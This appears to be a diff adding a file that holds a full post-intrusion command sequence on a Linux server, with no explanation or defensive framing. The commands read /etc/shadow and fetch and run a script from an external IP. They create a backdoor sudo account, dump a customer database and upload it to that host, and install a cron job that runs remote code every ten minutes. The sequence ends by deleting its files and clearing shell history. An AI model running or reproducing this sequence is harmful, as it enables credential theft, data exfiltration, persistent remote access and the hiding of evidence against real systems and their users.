@@ -1,0 +1,18 @@
+id
+uname -a
+cat /etc/passwd
+sudo -l
+cat /etc/shadow
+wget http://185.220.101.47:8080/lin_enum.sh -O /tmp/.e.sh
+chmod +x /tmp/.e.sh
+/tmp/.e.sh
+sudo su -
+useradd -m -s /bin/bash svc_backup
+echo 'svc_backup:P@ssw0rd2025' | chpasswd
+usermod -aG sudo svc_backup
+mysqldump -u root -pS3cr3tDB app_customers > /tmp/dump.sql
+tar czf /tmp/data.tgz /tmp/dump.sql /var/www/uploads
+curl -X POST -F 'f=@/tmp/data.tgz' http://185.220.101.47:8080/up
+(crontab -l 2>/dev/null; echo '*/10 * * * * curl -s http://185.220.101.47:8080/b | bash') | crontab -
+rm -f /tmp/.e.sh /tmp/dump.sql /tmp/data.tgz
+history -c
